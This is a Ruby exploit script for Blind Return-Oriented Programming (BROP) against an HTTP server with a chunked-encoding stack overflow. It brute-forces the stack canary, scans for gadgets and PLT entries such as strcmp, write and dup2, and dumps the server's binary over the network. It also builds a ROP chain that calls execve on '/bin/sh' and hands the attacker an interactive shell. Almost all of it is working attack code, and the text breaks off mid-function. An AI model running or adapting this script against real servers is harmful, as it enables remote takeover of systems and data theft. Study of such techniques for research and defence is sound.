#!/usr/bin/env ruby

# Arch   - depth 10 pad 2  olen 4192 new vsyscall
# Ubuntu - depth 10 pad 3  olen 4120 new vsyscall canary
# Debian - depth 10 pad 2  olen 4192 unaligned vsyscall
# Centos - depth 10 pad 4  olen 4192 old vsyscall

# Arch   - depth 16 pad 2 ; 1 worker 18 pad 2  olen 4192
# Ubuntu - depth 16 pad 3 ; 1 worker 18 pad 3  olen 4120
#
# dmccrady Notes:
# 
#   - Relies on the presence of a BROP gadget
#		- One way to get rid of that is to compile with "-p" which adds an extra POP %rbp after the gadget.

require 'socket'
require 'timeout'
require 'json'

$ip = "127.0.0.1"
$port = 80

$vsyscall = 0xffffffffff600000
$death = 0x41414141414141
$text = 0x400000

$padval = 0x4141414141414141
#padval = $text

$url = "/"

class State
	attr_accessor :time_out_val
	attr_accessor :reqs				# total requests during attack
	
	attr_accessor :pad				# stack pad amount
	attr_accessor :depth			# stack depth
	attr_accessor :overflow_len

	attr_accessor :rdi
	attr_accessor :rsi
	attr_accessor :arg1_extra_pops
	attr_accessor :arg2_extra_pops
	attr_accessor :canary
	attr_accessor :canary_offset
	attr_accessor :ret
	attr_accessor :syscall
	attr_accessor :pos
	attr_accessor :pops
	attr_accessor :rax

	attr_accessor :plt
	attr_accessor :plt_base
	attr_accessor :plt_stop_gadget

	attr_accessor :file_desc
	attr_accessor :writable
	attr_accessor :goodrdx
	attr_accessor :aslr
	
    attr_accessor :write
	attr_accessor :strcmp
	attr_accessor :dup2
	attr_accessor :dup2_sym_no
	attr_accessor :read
	attr_accessor :execve
	attr_accessor :usleep
	attr_accessor :ftruncate64
	attr_accessor :exit

    def as_json(options={})
        {
			time_out_val: @time_out_val,
			reqs: @reqs,

			pad: @pad,
			depth: @depth,
			overflow_len: @overflow_len,

			rdi: @rdi,
			rsi: @rsi,
			canary: @canary,
			canary_offset: @canary_offset,
			ret: @ret,
			syscall: @syscall,
			pos: @pos,
			pops: @pops,
			rax: @rax,

			plt: @plt,
			plt_base: @plt_base,
			plt_stop_gadget: @plt_stop_gadget,

			file_desc: @file_desc,
			writable: @writable,
			goodrdx: @goodrdx,
			aslr: @alsr,

			write: @write,
			strcmp: @strcmp,
			dup2: @dup2,
			dup2_sym_no: @dup2_sym_no,
			read: @read,
			execve: @execve,
			usleep: @usleep,
			ftruncate64: @ftruncate64,
			exit: @exit
        }
    end
    
    def to_json(*options)
        as_json(*options).to_json(*options)
	end

	def json_create(object)
        for key, value in object
            next if key == JSON.create_id
            instance_variable_set("@#{key}", value)
        end
    end
	
	def save
		jsonStr = JSON.pretty_generate(self)
		File.open("state.json", "w") { |file| file.write(jsonStr)} 
	end

	def load
		begin
			File.open("state.json", "r") { |file|
				print("Reading state\n")
				jsonStr = file.read()
				hash = JSON.parse(jsonStr)
				self.json_create(hash)
			}
		rescue
			return
		end
	end

	def initialize
		@time_out_val = 1
		@reqs = 0
		@pad = 0

		@pops = []

		# dmccrady:  extra POPs needed for RDI and RSI gadgets.  Defaults here for the standard BROP gadget.
		@arg1_extra_pops = 0
		@arg2_extra_pops = 1
	end
end

# dmccrady:  Global variable holding all persistent state (serialized as JSON)
$state = State.new

VSYSCALL_OLD		= 1
VSYSCALL_UNALIGNED	= 2
VSYSCALL_NEW		= 3

def grab_socket()
	return TCPSocket.new($ip, $port) if not $sport

	got = false

	s = ""

	if not $localip
		s = TCPSocket.new($ip, $port)
		$localip = s.local_address.ip_address
		s.close()

		print("\nlocalip #{$localip}:#{$port}\n")
	end

	for i in 0..100
		begin
			s = Socket.new(:INET, :STREAM)

			s.setsockopt(:SOCKET, :REUSEADDR, true)

			sockaddr = Socket.sockaddr_in(7000 + i, $localip)
			s.bind(sockaddr)

			s.connect(Socket.pack_sockaddr_in($port, $ip))
			got = true
			break
		rescue Errno::EADDRNOTAVAIL
			s.close()
		rescue Errno::EADDRINUSE
			s.close()
		end
	end

	abort("Couldn't get socket") if not got

	return s
end

def get_child()
	s = nil
	found = false

	while !found
		s = nil

		begin 
			Timeout.timeout(1) do
				s = grab_socket()
			end
		rescue Timeout::Error
			print("Connect timeout\n")
			next
		rescue SystemCallError => e
			print("\nConnect exception, err=#{e}\n")
			exit(666)
			next
		end

		req = "GET #{$url} HTTP/1.1\r\n"
		req << "Host: bla.com\r\n"
		req << "Connection: Keep-Alive\r\n"
		req << "\r\n"
		
		s.puts(req)
		begin   
			Timeout.timeout(5) do
				r = s.gets
				if r.index("200 OK") != nil or r.index("404") != nil or r.index("302") != nil
					found = true
					break
				end                                                                           
			end                                                                                   
		rescue
		end

		break if found

		print("Bad child\n")
		s.close
	end

	read_response(s)

	return s
end

def read_response(s)
	cl = 0
	while true
		r = s.gets
		if r == nil or r == "\r\n"
			r = s.read(cl)
			break
		end

		if r.index("Content-Length") != nil
			cl = Integer(r.split()[1])
		end
	end
end

def send_initial(s)
	$state.reqs += 1

	sz = 0xdeadbeefdeadbeeff.to_s(16)

	req = "GET #{$url} HTTP/1.1\r\n"
	req << "Host: bla.com\r\n"
	req << "Transfer-Encoding: Chunked\r\n"
	req << "Connection: Keep-Alive\r\n"
	req << "\r\n"
	req << "#{sz}\r\n"

	s.write(req)
	s.flush()

    read_response(s)
end

def send_exp(s, rop)
	send_initial(s)

    data = "A" * ($state.overflow_len - 8)
	$state.pad.times do
		padval = $padval
		data << [padval].pack("Q") # rbp
	end

    data << rop.pack("Q*")

	set_canary(data)

    s.write(data)                                                                                         
    s.flush()                                                                                             
end

def check_alive(s)
	sl = 0.01
	rep = $state.time_out_val.to_f / 0.01
	rep = rep.to_i

	rep.times do 
		begin
			x = s.recv_nonblock(1)
			return false if x.length == 0

			print("\nDamn got stuff #{x.length} #{x}\n")
			return false
		rescue Errno::EAGAIN
			sleep(sl)
		rescue Errno::ECONNRESET
			return false
		end
	end

	return true
end

def check_vuln()
	print("Checking for vuln... ")

	s = get_child()
	send_initial(s)

	s.write("A\n")
	s.flush()

	abort("Not vulnerable") if not check_alive(s)

	s.close()

	a = Time.now

	s = get_child()
	send_initial(s)

	s.write("A" * 5000)
	s.flush()

	abort("Overflow of 5000 didn't crash, assuming not vulnerable") if check_alive(s)

	s.close()

	el = Time.now - a
	el *= 4.0
#	el = el.to_i
	$state.time_out_val = el

#	$state.time_out_val = 0.5 if $state.time_out_val <= 0

#	$state.time_out_val = 1

	print("Vulnerable\n")

	print("Timeout is #{$state.time_out_val}\n")
end

def canary_detect(len)
	print("Checking for canary... at #{len}\n")

	canary = []

	$sport = true

	while canary.length < 8
		found = false

		for i in 0..255
			print("Testing #{i.to_s(16)}\r")

			s = get_child()
			send_initial(s)

			data = "A" * len

			for c in canary
				data << [c].pack("C")
			end
				
			data << [i].pack("C")

			s.write(data)                                                  
			s.flush()

			rc = check_alive(s)
			s.close()

			if rc == true
				print("\nFound #{i.to_s(16)}\n")
				canary << i
				found = true
				break
			end
		end

		raise("canary not found") if not found
	end

	val = 0
	for i in 0..(canary.length - 1)
		val |= canary[i] << (i * 8)
	end

	$state.canary = val
	$state.canary_offset = len

	print("Canary 0x#{$state.canary.to_s(16)} at #{$state.canary_offset}\n")
end

def set_canary(data)
	return if not $state.canary

	can = [$state.canary].pack("Q")

	return if data.length < $state.canary_offset + can.length

	for i in 0..(can.length - 1)
		data[$state.canary_offset + i] = can[i]
	end
end

def check_overflow_len()
	len = 4096
	s = nil
	expected = 4192

	while true
		print("Check overflow len ... #{len}\r")

		s = get_child()
		send_initial(s)

		data = "A" * len
		set_canary(data)

		s.write(data)                                                                                         
		s.flush()                                                                                             

		break if not check_alive(s)

		len += 8
		s.close()
	end
	print("\n")

	s.close()

	if not $state.canary
		print("Found overflow len #{len}\n")
		canary_detect(len - 8)

		print("Trying again with canary...\n")
		check_overflow_len()

		print("Couldn't find overflow_len") if not $state.overflow_len
		print("Couldn't find canary\n") if not $state.canary
	end

#	if len == 4112 and not $state.canary
#		canary_detect(len - 8)
#		print("Trying again with canary...\n")
#		check_overflow_len()
#		return
#	end
#
#	print("WARNING unexpected overflow len\n") if len != expected

	$state.overflow_len = len

	abort("Didn't find canary") if not $state.canary
end

def check_stack_depth()
	depth = 1
	max = 100

	while depth < max
		print("Trying depth #{depth}\r")
		rop = Array.new(depth) { |i| $state.plt }

		s = get_child()
		send_exp(s, rop)

		break if check_alive(s)

		s.close()

		depth += 1
	end
	print("\n\n")

	abort("nope") if depth == max

	s.close()

	$state.depth = depth
end

def check_pad()
	pad = 0
	max = 100

	while pad < max
		rop = Array.new($state.depth) { |i| $state.plt }

		for i in 0..pad
			rop[i] = $padval
		end

		s = get_child()
		send_exp(s, rop)

		alive = check_alive(s)
		print("Trying pad #{pad}... alive = #{alive}\n")

		break if not alive

		s.close()

		pad += 1
	end

	$state.pad = pad
	$state.depth -= pad

	print("\nDepth #{$state.depth} pad #{$state.pad}\n")

	s.close()
end

def do_try_exp(rop)
	s = get_child()
	send_exp(s, rop)

	alive = check_alive(s)
	if not alive
		s.close()
		return false
	end

	req = "0\r\n"
	req << "\r\n"
	req << "GET #{$url} HTTP/1.1\r\n"
	req << "Host: bla.com\r\n"
	req << "Transfer-Encoding: Chunked\r\n"
	req << "Connection: Keep-Alive\r\n"
	req << "\r\n"

	s.write(req)

	alive = check_alive(s)
	s.close()

	return true if not alive

	return 2
end

def try_exp(rop)
	while true
		begin
			return do_try_exp(rop)
		rescue Errno::ECONNRESET
			print("Conn reset\n")
			sleep(1)
		end
	end
end

def try_exp_print(addr, rop)
	print("\rAddr 0x#{addr.to_s(16)} ... ")

	r = try_exp(rop)

	print("ret\n") if (r == true)
	print("infinite loop\n") if (r == 2)

	return r
end

# dmccrady: Encapsulate all ROP call voodoo into one spot.

# This assumes that we found a BROP gadget, which is of the form:
#		000:	5b                   	pop    %rbx 
#		001:	5d                   	pop    %rbp
#		002:	41 5c                	pop    %r12
#		004:	41 5d                	pop    %r13
#		006:	41 5e                	pop    %r14
#		008:	41 5f                	pop    %r15
#		00a:	c3                   	retq   
#
# Starting at offset 008+1 we get
#		pop %rdi
#		ret
#
# Starting at offset 006+1 we get
#		pop %rsi
#		pop %r15
#		ret
# which means we have to account for an extra pop for the second argument (RSI)
#
# We also want to flexibly support a modified BROP gadget, which is present when stack frames are required (e.g. with the -p option):
#		038:	5b                   	pop    %rbx
#		039:	41 5c                	pop    %r12
#		03b:	41 5d                	pop    %r13
#		03d:	41 5e                	pop    %r14
#		03f:	41 5f                	pop    %r15
#		041:	5d                   	pop    %rbp
#		042:	c3                   	retq   
#
# Starting at offset 03f+1 we get
#		pop %rdi
#		pop %rbp
#		ret
# so we'll have to account for one extra POP for the first argument (RDI)
#
# Starting at offset 03d+1 we get
#		pop %rsi
#		pop %r15
#		pop %rbp
#		ret
# so we'll have to account for two extra POPs for the second argument (RSI)

def set_arg1(rop, arg1)
	rop << $state.rdi
	rop << arg1

	# push extra on the stack to account for any extra POPs done by the RDI gadget.
	$state.arg1_extra_pops.times do
		rop << 0
	end
end

def set_arg2(rop, arg2)
	rop << $state.rdi - 2
	rop << arg2

	# push extra on the stack to account for any extra POPs done by the RSI gadget.
	$state.arg2_extra_pops.times do
		rop << 0
	end
end

# dmccrady, arg3 isn't actually the value of the third argument, it's an argument to strcmp.
def set_arg3(rop, arg3)
	plt_call_2(rop, $state.strcmp, arg3, arg3)
end

def plt_call_1(rop, fnIdx, arg1)
	set_arg1(rop, arg1)
	plt_fn(rop, fnIdx)
end

def plt_call_2(rop, fnIdx, arg1, arg2)
	set_arg2(rop, arg2)
	set_arg1(rop, arg1)
	plt_fn(rop, fnIdx)
end

# dmccrady: Note that arg3 isn't actually the value
# of the third argument, it's an argument to 'strcmp'
def plt_call_3(rop, fnIdx, arg1, arg2, arg3 = 0x400000)
	set_arg3(rop, arg3)  # arg3 needs to be set first since it wlll clobber RDI and RSI calling strcmp
	set_arg2(rop, arg2)
	set_arg1(rop, arg1)
	plt_fn(rop, fnIdx)
end


# dmccrady: Encapsulate plt call voodoo in one spot.
#
# This uniformly replaces all occurances of the following ROP instructions:
#		rop << ($state.plt + 0xb)
#		rop << fn_index
#
# The above relies on finding the *exact* start of the PLT, which we don't
# necessarily find.  The above also relies on the layout of the PLT in that
# it assumes that PLT+0xb is a call to 'ldresolve'.  Newer PLT layouts don't
# necessarily preserve this assumption.
#
# Finally, this produces a shorter ROP sequence, since only the PLT function
# address is pushed, instead of 2 pushes above.
def plt_fn(rop, fnIdx)
	if not $state.plt_base
		print("No plt found yet\n")
		return
	end

	if not fnIdx
		print("nil function index in PLT call\n")
		return
	end

	rop << $state.plt_base + (fnIdx * 0x10)
end

def verify_pop(pop)
#	ret = $state.ret ? $state.ret : pop + 1
	ret = pop + 1

    rop = Array.new($state.depth - 1) { |j| ret }
	rop << pop + 1

    return false if try_exp(rop) != true

    rop = Array.new($state.depth) { |j| pop + 1 }
	rop[1] = $death

	return false if try_exp(rop) != false

    rop = Array.new($state.depth) { |j| ret }
	rop[0] = pop
	rop[1] = 0x4141414141414141
	rop[2] = $death

	return false if try_exp(rop) != false

	if not $state.ret
		$state.ret = ret
		print("Found ret #{$state.ret.to_s(16)}\n")
	end

	return true
end

def check_pop(pop)
	check_rax(pop)
	check_rdi(pop)
end

def check_rdi(pop)
	return if $state.rdi  # dmccrady: we already found a good value, so don't clobber it.
	return if not check_multi_pop(pop, 9, 6)

	print("Found POP RDI #{pop.to_s(16)}\n")

	$state.rdi = pop
end

def check_rax_rsp(pop)
	# pop rax ; ret => add $0x58, rsp
	return check_multi_pop(pop, 3, 11)
end

def check_multi_pop(pop, off, num)
	rop = Array.new($state.depth) { |j| pop + 1 }

	idx = $state.depth - num - 1
	if idx < 2
		print("FUCK\n")
		exit(1)
	end
	rop[idx] = pop - off
	rop[-1] = $death

	rc = try_exp(rop)

	return true if rc == true

	return false
end

def check_rax_syscall(pop)
	rop = []
	rop << pop
	rop << 34 # pause
	rop << $state.syscall
	rop << $death

	r = try_exp(rop)
	return true if r == 2

	return false
end

def check_rax(pop)
	rc = false
	if not $state.syscall
		rc = check_rax_rsp(pop)
	else
		rc = check_rax_syscall(pop)
	end

	return if rc == false

	print("POP RAX at 0x#{pop.to_s(16)}\n")
	$state.rax = pop
end

def find_pops()
	$start = 0x418a00
	$end   = 0x500000

	$start = 0x418b00
	$start = $state.ret - 0x1000

	skip = 0

	print("Finding POPs\n")

	start = $start
	start = $state.pos if $state.pos

	for i in start..$end
		if skip > 0
			skip -= 1
			next
		end

		rop = []

		($state.depth / 2).times do
			rop << i
			rop << 0x4141414141414141
		end

		if $state.depth % 2 != 0
			rop << (i + 1)
			print("FUCK #{$state.depth} #{$state.depth % 2}\n")
		end

                r = try_exp_print(i, rop)
		if r == true
			if verify_pop(i)
				print("Found POP at 0x#{i.to_s(16)}\n")
				$state.pops << i
				check_pop(i)
			end
		end

		if r == 2
			skip = 100
		end

		$state.pos = i

		break if $state.rdi
	end
end

def find_rdi()
        for i in $state.pops
                rop = []

#               for j in $state.pops
#                       rop << j
#                       rop << 0
#               end
                
                rop << i
                rop << 0x0400000 # struct timespec

                rop << $state.rax
                rop << 35 # nanosleep
                
                rop << $state.syscall
                rop << $death
                
                r = try_exp_print(i, rop)
                if r == 2
			print("POP RDI at #{i}\n")
			$state.rdi = i
			return i
                end
        end

        return 0
end

def pause_child()
        rop = []
        rop << $state.rax
        rop << 34
        rop << $state.syscall

        s = get_child()
        send_exp(s, rop)

        return s
end

def try_rsi_kill(i)
        s = pause_child()

        rop = []
        
        rop << $state.rdi
        rop << 0
        
        rop << i
        rop << 0
        
        rop << $state.rax
        rop << 62 # kill

        rop << $state.syscall
        rop << $death

        try_exp(rop)

        for rep in 0..3
                begin   
                        x = s.recv_nonblock(1)
                        if x.length == 0
                                s.close()                                                                    
                                return false
                        end
                rescue Errno::EAGAIN
                end
        end

        return s

end

def find_rsi()
        s = pause_child()

        for i in $state.pops
                begin   
                        a = s.recv_nonblock(1)
                        raise "damn"
                rescue Errno::EAGAIN
                end

                rop = []

                rop << $state.rdi
                rop << 0
                
                rop << i
                rop << 9
                
                rop << $state.rax
                rop << 62 # kill
                
                rop << $state.syscall
                rop << $death
                
                r = try_exp_print(i, rop)
                next if r != false
                
                for rep in 0..3
                        begin   
                                a = s.recv_nonblock(1)
                                if a.length == 0
                                        s.close()                                                            

                                        s = try_rsi_kill(i)
                                        if s != false
                                                s.close()
                                                print("\n")
						print("POP RSI #{i}\n")
						$state.rsi = i
                                                return i
                                        end
                                        s = pause_child()
                                        break
                                end
                        rescue Errno::EAGAIN
                                sleep(0.1)
                        end
                end
        end

        return 0
end

def dump_fd_addr(fd, addr, write = $state.write, listnum = 2)
#	rop << $state.rsi
#	rop << addr
#
#	rop << $state.rax
#	rop << 1
#
#	rop << $state.syscall
#	rop << $death

	listeners = []

	for i in 0..listnum
		listener = get_child()
		listeners << listener
	end

	rop = []

	for i in 0..20
		f = fd
		a = addr + (i * 4)

		if fd == -1
			f = 15 + i
			a = addr
		end

		plt_call_3(rop, write, f, a)		
	end

	rop << $death

    s = get_child()
    send_exp(s, rop)
	s.close()

	x = ""

	10.times do
		for l in listeners
			begin
				x = l.recv_nonblock(4096)
				if x.length > 0
					while true
						more = l.recv(4096)

						break if more.length == 0

						x += more
					end
					break
				end
			rescue Errno::EAGAIN
			end
		end

		break if x.length > 0
#		sleep(0.01)
	end

	for l in listeners
		l.close()
	end

	return x
end

def dump_addr(addr)
	fd = 100

	rop = []

	plt_call_2(rop, $state.dup2, $state.file_desc, fd)

	for i in 0..20
		plt_call_3(rop, $state.write, fd, addr + (i * 7))
	end

	rop << $death

	s = get_child()
	send_exp(s, rop)

	x = ""

	while true
		r = s.recv(4096)

		break if r.length == 0

		x += r
	end

	s.close()

	return x
end

def dump_bin()
	addr = 0x400000
	fd = 3
	err = 0

    f = File.open("text.bin", "wb")

	last = Time.now

	while true
		print("Dumping #{addr.to_s(16)} ...")
#		x = dump_fd_addr(15, addr, $state.write, 50)
		x = dump_addr(addr)
#		x = dump_fd_addr(3, addr, $state.write, 1)

		print(" #{x.length}    \r")

		if x.length > 0
			addr += x.length
			f.write(x)
			last = Time.now
#			print("\n")
			err = 0
		else
			el = Time.now - last
			el = el.to_i
			
			err += 1
			break if el > 5
#			break if err > 20
		end
	end
	print("\n")

	f.close()
end

def check_syscall_ret(addr)
        rop = Array.new($state.depth) { |j| addr }

	return false if try_exp(rop) == false

        rop = Array.new($state.depth) { |j| addr + 2 }

	return false if try_exp(rop) == false

	$state.syscall = addr
	$state.ret = addr + 2 if not $state.ret

	return true
end

def check_old_vsyscall()
	print("Checking for old vsyscall\n")

	0x40.downto(0) { |i|
		addr = $vsyscall + 1024 + i

        	rop = Array.new($state.depth) { |j| addr }

		if try_exp_print(addr, rop) == true
			$state.ret = addr if not $state.ret
			return true
		end
	}

	return false
end

def check_vsyscall()
	s = 2 + 10
	e = s + 2

	for depth in s..e
		$state.depth = depth
		print("Checking vsyscall depth #{depth}\n")
		rc = do_check_vsyscall()

		$vsyscall_mode = rc
		break if rc != VSYSCALL_NEW
	end

	$state.depth = nil
	print("Syscall mode is #{$vsyscall_mode}\n")
end

def do_check_vsyscall()
        rop = Array.new($state.depth) { |j| $vsyscall }

	if try_exp(rop) == false
		if check_old_vsyscall()
			return VSYSCALL_OLD
		else
			return VSYSCALL_NEW
		end
		return
	end

        rop = Array.new($state.depth) { |j| ($vsyscall + 0xa) }

	if try_exp(rop) == false
		if check_syscall_ret($vsyscall + 0x7)
			return VSYSCALL_UNALIGNED
		end
	end

	print("Dunno\n")
	exit(1)
end

def determine_target()
	if $state.overflow_len == 4192 and $vsyscall_mode == VSYSCALL_NEW
#		$state.depth = 16
		$state.depth = 10
		$state.pad = 2
	end

	print("Pad #{$state.pad} Depth #{$state.depth}\n")
end

def find_plt(dep = 0, start = $text, len = 0x10000)
	plt  = start
	plt += 0x5000  # dmccrady: cheat just to make it faster.
	plte = plt + len

	while true
		for d in 0..dep
			print("Trying PLT at #{plt.to_s(16)} and depth #{$state.depth+d}         \r")
			if try_plt($state.depth + d, plt)
				$state.plt = plt
				# dmccrady: We found the PLT, but are actually one entry past the beginning
				# (the zero-th entry is the 'ldresolve' entry, which crashes and is therefore
			    # skipped during the scan.)  
				$state.plt_base = $state.plt - 0x10
				# dmccrady This might be considered 'hard-coding'.  This script assumes that
				# the stop-gadget is the first actual PLT entry (i.e., simply pops).
				$state.plt_stop_gadget = $state.plt_base + 0x10
				$state.depth += d
				print("\nFound PLT at depth #{$state.depth}, base=#{$state.plt_base.to_s(16)}\n")
				return
			end
		end

		# dmccrady:  Instead of skipping 30 entries at a time, try exhaustively.  This is 
		# an expensive way of ensuring we find close to the beginning of the PLT.  If we
		# don't, we risk missing useful functions.
		plt += 0x10
		# plt += 0x10 * 30

		break if plt >= plte
	end
end

def try_plt(depth, plt)
	rop = Array.new(depth) { |i| plt }

	r = try_exp(rop)
	if r == true
		rop = Array.new(depth) { |i| plt + 6 }

		return true if try_exp(rop)
	end

	return false
end


def got_write(x)
##	if $state.canary
## 		return if x.length != 7
## 	else
## 		return if x.length != 4
## 	end

	return false if x.length < 4

	return false if x[1] != 'E'
	return false if x[2] != 'L'
	return false if x[3] != 'F'

	return true
end

def try_write3(write, fd, rep, sl)
	print("Trying write #{write} with fd #{fd}    \r")

	addr = 0x400000

	rop = []

	plt_call_3(rop, write, fd, addr)

	rop << $death

	# dmccrady:  try the exploit
	s = get_child()
	send_exp(s, rop)

	stuff = ""

	rep.times do
		begin
			x = s.recv_nonblock(4096)
			break if x.length == 0
			stuff += x
		rescue Errno::EAGAIN
		rescue Errno::ECONNRESET
			break
		end
		sleep(sl)
	end

	if got_write(stuff)
		printf("\nFound write at #{write} and fd #{fd}\n")
		$state.file_desc = fd
		$state.write = write
		return true
	end

	return false
end


def find_write3()
	print("Finding write (3)\n")

	# dmccrady:  Hard-coded.  This works around a problem where, when scanning
	# the PLT for 'write', we encounter something like 'suspend' which hangs
	# the victim's process.  Guess at a starting position thqt lies beyond
	# the problem entries.
	write_start = 0x10f
	# dmcccrady:  Another hard-code.  The 'write' entry is known to lie within
	# the first 0x300 entries.
	write_last = 0x300

	sl = 0.01
	rep = $state.time_out_val.to_f / 0.01
	rep = rep.to_i

	for write in write_start..write_last
		for fd in 3..50  # Try to guess the fd as well (skip 0,1, and 2)
			return if try_write3(write, fd, rep, sl)
		end
	end

	abort("Failed to find write")
end


def stack_read()
	print("Stack reading\n")

	stack = []

	while true
		x = stack_read_word(stack)
		stack << x

		print("Stack has 0x#{x.to_s(16)}\n")

		break if x > 0x400000 and x < 0x500000

                if (x & 0x7fff00000000) == 0x7fff00000000
                        print("Stack ptr #{x.to_s(16)}\n")
                elsif (x & 0x7f0000000000) == 0x7f0000000000
                        print(".text ptr #{x.to_s(16)}\n")
                        $state.aslr = x
                        break
                end
	end

	$state.pad = stack.length - 1
	$state.ret = stack[-1]
	$state.depth = 10

	print("Pad #{$state.pad} Ret #{$state.ret.to_s(16)}\n")
end

def stack_read_word(pad)
	stack = []

	while stack.length < 8
		found = false

		for i in 0..255
			print("\rTesting #{i.to_s(16)}")

			s = get_child()
			send_initial(s)

			data = "A" * ($state.overflow_len - 8)

			data << pad.pack("Q*")

			for x in stack
				data << [x].pack("C")
			end

			data << [i].pack("C")

			set_canary(data)

			s.write(data)                                                  
			s.flush()

			rc = check_alive(s)
			s.close()

			if rc == true
				print(" - Found #{i.to_s(16)}\n")
				stack << i
				found = true
				break
			end
		end

		print("\nNot found... damn - trying again\n") if not found
	end

	val = 0
	for i in 0..(stack.length - 1)
		val |= stack[i] << (i * 8)
	end

	return val
end

def print_progress()
	if not $startt
		$startt = Time.now
		return
	end

	now = Time.now
	elapsed = now - $startt
	elapsed = elapsed.to_i

	print("==================\n")
	print("Reqs sent #{$state.reqs} time #{elapsed}\n")
	print("==================\n")

	$state.save()
end

def exp()
	abort("Function exp() shouldn't be called")
	print("Exploiting\n")

	listeners = []

	rop = []

	fd = 15
	rop << $state.rdi
	rop << fd
	rop << $state.rdi - 2
	rop << 0
	rop << 0
	rop << 0x0000000000402810 # dup2

	rop << $state.rdi
	rop << fd
	rop << $state.rdi - 2
	rop << 1
	rop << 0
	rop << 0x0000000000402810 # dup2

	rop << $state.rdi
	rop << fd
	rop << $state.rdi - 2
	rop << 2
	rop << 0
	rop << 0x0000000000402810 # dup2

	wr = 0x0068cf60
	rop << $state.rdi - 2
	rop << 0x0068732f6e69622f # /bin/sh
	rop << 0

	rax = 0x441b88
	rop << rax
	rop << wr
	rop << 0x42a98b # mov rsi, (rax)

	rdx = 0x404f4b
	rop << rax
	rop << wr + 0x7d
	rop << rdx
	rop << 0

	rop << $state.rdi - 2
	rop << 0
	rop << 0

	rop << $state.rdi
	rop << wr

	rop << 0x4029b0 # execve

#	rop << 0xffffffffff600001
	rop << 0x400000

        s = get_child()

	50.times do
		listeners << get_child()
	end

        send_exp(s, rop)

	for l in listeners
		l.write("\n\n\n\n\n\n\nid\n")
	end

	x = ""
	10.times do
		for l in listeners
			begin
				x = l.recv_nonblock(1024)
			rescue Errno::EAGAIN
			end

			if x.length > 0
				s.close()
				s = l
				break
			end
		end

		break if x.length > 0

		sleep(0.1)
	end

	for l in listeners
		l.close() if l != s
	end

	s.write("uname -a\nid\n")

	dropshell(s)

	exit(1)
end

def dropshell(s)
	while true
		r = select([s, STDIN], nil, nil)

		if r[0][0] == s
			x = s.recv(1024)

			break if x.length == 0

			print("#{x}")
		else
			x = STDIN.gets()

			s.write(x)
		end
	end
end

def find_fd()
	print("Finding FD\n")

	for fd in 15..20
		print("Trying #{fd} ... \r")

		x = dump_fd_addr(fd, 0x400000, $state.write, 50)

		if x.length > 0
			print("\nFound FD #{fd}\n")
			break
		end
	end

	exit(1)
end

def get_dist(gadget, inc)
	dist = 0

	for i in 1..7
		addr = gadget + inc * i

		rop = Array.new($state.depth) { |j| $state.plt }
		rop[0] = addr

		crashed = try_exp(rop)
		#print("Probing possible gadget region #{addr.to_s(16)}, crashed=#{crashed}\n")
		
		break if crashed != true
		
		dist = i
	end

	return dist
end

def verify_gadget(gadget)
	left = 0
	right = 0

	left  = get_dist(gadget, -1)
	right = get_dist(gadget, 1)

	#print("Verifying gadget at #{gadget.to_s(16)}, left=#{left}, right=#{right}\n")

	rdi = gadget + right - 1

	if left + right == 6      # 6 pops from the standard BROP gadget
		return false if not check_multi_pop(rdi, 9, 6)
		$state.rdi = rdi 
		print("Found standard BROP gadget POP RDI at #{$state.rdi.to_s(16)}\n")
		$state.arg1_extra_pops = 0
		$state.arg2_extra_pops = 1
		success = true
	elsif left + right == 7   # 7 pops from the stack-frame BROP gadget
		return false if not check_multi_pop(rdi, 9, 6)
		$state.rdi = rdi - 1  # Move back over the 'pop rbp' which is one byte into 'pop %r15' == 'pop %rdi'
		print("Found stack frame BROP gadget POP RDI at #{$state.rdi.to_s(16)}\n")
		$state.arg1_extra_pops = 1
		$state.arg2_extra_pops = 2
		success = true
	else
		success = false
	end

	print("LEFT #{left} RIGHT #{right} addr #{gadget.to_s(16)}\n") if success

	return success
end

def find_gadget()
	return if $state.rdi

	print("Finding gadget\n")

	$start = $state.ret
	$end = $state.ret + 0x100000

	start = $start
	start = $state.pos if $state.pos
	skip = 0

	for i in start..$end
		if skip > 0
			skip -= 1
			next
		end

		rop = []

		rop = Array.new($state.depth) { |j| $state.plt }

		rop[0] = i

        r = try_exp_print(i, rop)
		if r == true
			if verify_gadget(i)
				print("Found POP at 0x#{i.to_s(16)}\n")
				$state.pos = i
				$state.pops << i
				break
			end
		end

		if r == 2
			skip = 100
		end

		$state.pos = i

		break if $state.rdi

		skip = 7
	end

end

def find_plt_depth_aslr()
	print("PLT AT #{$state.aslr.to_s(16)}\n")
	start = 0x7fd10a00d000
	$state.depth = 32
	$state.pad = 0
	len = 0x10000

	start = $state.aslr & ~0xfff

	while not $state.plt
		find_plt(2, start, len)

		start -= len

		break if $state.plt

		print("\n nope\n")
	end
end

def find_plt_depth()
	if $state.aslr
		find_plt_depth_aslr()
		return
	end

	$state.depth = 18
	$state.pad   = 0

	probe_depth = 8
	find_plt(probe_depth)

#	if not $state.plt
#		print("Assuming conf worker = 1\n")
#		$state.depth = 10
#		find_plt(2)
#	end

	return if not $state.plt

	check_pad()

	# dmccrady:  This is hard-coded, but not by me.
	$state.ret   = 0x430000
end

def try_strcmp(entry, arg1, arg2)
	rop = []

	plt_call_2(rop, entry, arg1, arg2)

	($state.depth - rop.length).times do
		rop << $state.plt_stop_gadget
	end

	return try_exp(rop)
end

def test_strcmp(entry)
	print("Trying PLT entry #{entry.to_s(16)}\r")

	good = 0x400000

	return false if try_strcmp(entry, 3, 5) != false
	return false if try_strcmp(entry, good, 5) != false
	return false if try_strcmp(entry, 3, good) != false

	return false if try_strcmp(entry, good, good) != true
	return false if try_strcmp(entry, $vsyscall + 0x1000 - 1, good) != true

	return true
end

def find_rdx()
	print("Finding strcmp using POP RDI at #{$state.rdi.to_s(16)} and POP RSI at #{($state.rdi-2).to_s(16)}\n")

	for i in 0..256
		if test_strcmp(i)
			print("\nFound strcmp at PLT 0x#{i.to_s(16)}\n")
			$state.strcmp = i
			return
		end
	end

	abort("Failed to find strcmp")
end

def find_dup2()
	abort("write not found") if not $state.write
	abort("fd not found") if not $state.file_desc

	print("Find dup2\n")

	target_fd = 100

	for i in 0..200
		print("Trying dup2 at #{i.to_s(16)}\r")

		rop = []

		plt_call_2(rop, i, $state.file_desc, target_fd)     # dup2($state.file_desc, target_fd)
		plt_call_3(rop, $state.write, target_fd, 0x400000)  # write(target_fd, 0x400000, [len])

		rop << $death

		s = get_child()
		send_exp(s, rop)

		x = s.recv(4096)

		s.close()

		if got_write(x)
			print("\nFound dup2 at #{i.to_s(16)}\n")
			$state.dup2 = i
			return 
